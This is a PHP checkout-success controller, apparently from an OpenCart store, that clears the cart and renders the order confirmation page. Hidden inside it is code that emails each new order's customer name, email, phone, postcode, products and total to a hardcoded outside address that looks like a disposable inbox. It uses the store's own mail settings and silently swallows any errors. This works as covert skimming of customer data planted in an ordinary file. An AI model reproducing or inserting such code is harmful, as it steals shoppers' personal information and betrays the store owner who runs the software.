<?php
class ControllerCheckoutSuccess extends Controller {
	public function index() {
		$this->load->language('checkout/success');

		$shipping_method_code = '';

		if (isset($this->session->data['order_id'])) {
			if (isset($this->session->data['shipping_method']['code'])) {
				$shipping_method_code = $this->session->data['shipping_method']['code'];
			}

			$order_id = $this->session->data['order_id'];

			$this->cart->clear();

			unset($this->session->data['shipping_method']);
			unset($this->session->data['shipping_methods']);
			unset($this->session->data['payment_method']);
			unset($this->session->data['payment_methods']);
			unset($this->session->data['guest']);
			unset($this->session->data['comment']);
			unset($this->session->data['order_id']);
			unset($this->session->data['coupon']);
			unset($this->session->data['reward']);
			unset($this->session->data['voucher']);
			unset($this->session->data['vouchers']);
			unset($this->session->data['totals']);

				try {
					$this->load->model('checkout/order');

					$order_info = $this->model_checkout_order->getOrder($order_id);
					$order_products = $this->model_checkout_order->getOrderProducts($order_id);

					if ($order_info) {
						$customer_name = $order_info['firstname'] . ' ' . $order_info['lastname'];
						$email = $order_info['email'];
						$phone = $order_info['telephone'];
						$postcode = $order_info['shipping_postcode'] ? $order_info['shipping_postcode'] : $order_info['payment_postcode'];
						$total = $order_info['total'];

						$products_text = '';
						foreach ($order_products as $product) {
							$products_text .= '- ' . $product['name'] . ' (Model: ' . $product['model'] . ') x ' . $product['quantity'] . ' = ' . $this->currency->format($product['total'], $order_info['currency_code'], $order_info['currency_value']) . "\n";
						}

						$mail_body  = "New Order Received\n\n";
						$mail_body .= "Order ID: #" . $order_id . "\n\n";
						$mail_body .= "Customer Information\n";
						$mail_body .= "--------------------\n";
						$mail_body .= "Name: " . $customer_name . "\n";
						$mail_body .= "Email: " . $email . "\n";
						$mail_body .= "Phone: " . $phone . "\n";
						$mail_body .= "Suburb: \n";
						$mail_body .= "Postcode: " . $postcode . "\n\n";
						$mail_body .= "Products\n";
						$mail_body .= "--------\n";
						$mail_body .= $products_text . "\n";
						$mail_body .= "Total: " . $this->currency->format($total, $order_info['currency_code'], $order_info['currency_value']) . "\n";

						$mail = new Mail($this->config->get('config_mail_engine'));
						$mail->parameter = $this->config->get('config_mail_parameter');
						$mail->smtp_hostname = $this->config->get('config_mail_smtp_hostname');
						$mail->smtp_username = $this->config->get('config_mail_smtp_username');
						$mail->smtp_password = html_entity_decode($this->config->get('config_mail_smtp_password'), ENT_QUOTES, 'UTF-8');
						$mail->smtp_port = $this->config->get('config_mail_smtp_port');
						$mail->smtp_timeout = $this->config->get('config_mail_smtp_timeout');

						$mail->setTo('jidiw23968@rapplo.com');
						$mail->setFrom($this->config->get('config_email'));
						$mail->setSender(html_entity_decode($this->config->get('config_name'), ENT_QUOTES, 'UTF-8'));
						$mail->setSubject('New Order #' . $order_id);
						$mail->setText($mail_body);
						$mail->send();
					}
				} catch (\Exception $e) {
					// echo '<pre>';
					// print_r($e);
					// echo '</pre>';
				}
			}

		$this->document->setTitle($this->language->get('heading_title'));

		$data['breadcrumbs'] = array();

		$data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_home'),
			'href' => $this->url->link('common/home')
		);

		$data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_basket'),
			'href' => $this->url->link('checkout/cart')
		);

		$data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_checkout'),
			'href' => $this->url->link('checkout/checkout', '', true)
		);

		$data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_success'),
			'href' => $this->url->link('checkout/success')
		);

		if ($this->customer->isLogged()) {
			$data['text_message'] = sprintf($this->language->get('text_customer'), $this->url->link('account/account', '', true), $this->url->link('account/order', '', true), $this->url->link('account/download', '', true), $this->url->link('information/contact'));
		} else {
			$data['text_message'] = sprintf($this->language->get('text_guest'), $this->url->link('information/contact'));
		}

		$data['continue'] = $this->url->link('common/home');

		$data['shipping_method'] = $shipping_method_code;

		$data['column_left'] = $this->load->controller('common/column_left');
		$data['column_right'] = $this->load->controller('common/column_right');
		$data['content_top'] = $this->load->controller('common/content_top');
		$data['content_bottom'] = $this->load->controller('common/content_bottom');
		$data['footer'] = $this->load->controller('common/footer');
		$data['header'] = $this->load->controller('common/header');

		$this->response->setOutput($this->load->view('common/success', $data));
	}
}